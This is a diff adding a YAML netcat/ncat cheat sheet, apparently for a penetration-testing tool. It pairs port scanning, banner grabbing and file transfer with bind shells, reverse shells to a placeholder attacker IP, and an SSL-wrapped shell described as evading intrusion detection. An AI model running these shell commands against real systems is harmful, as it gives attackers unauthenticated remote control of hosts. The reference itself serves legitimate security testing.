@@ -1,0 +1,105 @@
+tool: netcat
+tags: [network, security, pentest, shell, transfer, enumeration, scanning]
+
+actions:
+  # === BASIC CONNECTIVITY AND SCANNING ===
+  - title: nc - port scanning
+    desc: |
+      Performs a basic TCP port scan on a specific target. The -z flag ensures
+      that nc does not send any data once the connection is established, making
+      it ideal for scanning. The -v flag provides verbose output to indicate
+      whether a port is open or closed.
+    command: "nc -zv {{target}} {{port_range|1-1000}}"
+
+  - title: nc - banner grabbing
+    desc: |
+      Connects to a specific port to retrieve the service banner. This is a 
+      fundamental step in reconnaissance to identify the software and version 
+      running on a port. Simply connecting and pressing 'Enter' often triggers
+       the service to reveal its identification string.
+    command: "nc -v {{target}} {{port}}"
+
+  # === LISTENER SETUP ===
+  - title: nc - basic tcp listener
+    desc: |
+      Sets up a TCP listener on the specified local port. This is frequently used
+      to receive incoming data or to catch a reverse shell during an exploit. 
+      The -l flag tells nc to listen, while -p specifies the port and -v enables
+      verbose logging for incoming connections.
+    command: "nc -nlvp {{lport|4444}}"
+
+  # === BIND SHELLS ===
+  - title: nc - bind shell linux
+    desc: |
+      Binds a bash shell to a local port on a Linux system. When a remote user
+      connects to this port, they are immediately granted access to the bash
+      environment. This is highly insecure and should only be used in 
+      controlled environments as it lacks any form of authentication.
+    command: "nc -nlvp {{lport|4444}} -e /bin/bash"
+
+  - title: nc - bind shell windows
+    desc: |
+      Binds the Windows command prompt (cmd.exe) to a local port. This allows
+      anyone who connects to that port to execute commands on the host machine.
+      Ensure the local firewall is configured to allow traffic on the chosen 
+      port for this to work successfully.
+    command: "nc -nlvp {{lport|4444}} -e cmd.exe"
+
+  # === REVERSE SHELLS ===
+  - title: nc - reverse shell linux
+    desc: |
+      Initiates a reverse shell from a Linux target back to an attacker's listener.
+      This technique is used to bypass restrictive inbound firewall rules by 
+      initiating an outbound connection. The attacker must have a listener
+      running (e.g., nc -lvp) on the specified IP and port before executing this.
+    command: "nc -nv {{attacker_ip}} {{attacker_port|4444}} -e /bin/bash"
+
+  - title: nc - reverse shell windows
+    desc: |
+      Connects back to an attacker's machine and provides a Windows cmd.exe shell.
+      It is a common method for maintaining access after a successful exploit on
+      a Windows system. Note that modern antivirus or EDR solutions may detect
+      and block this behavior.
+    command: "nc -nv {{attacker_ip}} {{attacker_port|4444}} -e cmd.exe"
+
+  # === FILE TRANSFER ===
+  - title: nc - receive file
+    desc: |
+      Sets up a listener to receive a file and save it to the local disk.
+      The output redirection operator (>) is used to capture the incoming 
+      stream and write it to the specified file name. Start this listener 
+      before the sender starts their connection.
+    command: "nc -nlvp {{lport|4445}} > {{incoming_file}}"
+
+  - title: nc - send file
+    desc: |
+      Sends a local file to a remote listener by redirecting the file content 
+      into the nc connection. This is a quick way to transfer scripts, binaries,
+      or data between machines without needing SSH or FTP. The receiver must 
+      be listening for the connection to be successful.
+    command: "nc -nv {{target_ip}} {{port|4445}} < {{file_to_send}}"
+
+  # === NCAT ADVANCED FEATURES ===
+  - title: ncat - bind shell with ssl and access control
+    desc: |
+      Creates an encrypted bind shell that only allows a specific source IP to
+      connect. Using the --ssl flag encrypts the traffic, making it harder for 
+      IDS systems to detect the shell commands. The --allow flag provides a 
+      basic layer of security by filtering who can connect.
+    command: "ncat --exec {{shell_path|/bin/bash}} --allow {{allowed_ip}} -vnl {{port|4444}} --ssl"
+
+  - title: ncat - secure connection with ssl
+    desc: |
+      Connects to a remote listener using SSL/TLS encryption. This is used to
+      interact with ncat listeners that have SSL enabled, ensuring the 
+      entire communication remains private. This can also be used to test
+      SSL-wrapped services like HTTPS or SMTPS.
+    command: "ncat -v {{target_ip}} {{port|4444}} --ssl"
+
+  - title: ncat - http proxy mode
+    desc: |
+      Turns ncat into a simple HTTP proxy server. This can be used for pivoting
+      traffic through a compromised machine or to route web traffic through
+      a specific network interface. This proxy does not support authentication 
+      in its simplest form.
+    command: "ncat --listen --proxy-type http {{lport|8080}}"
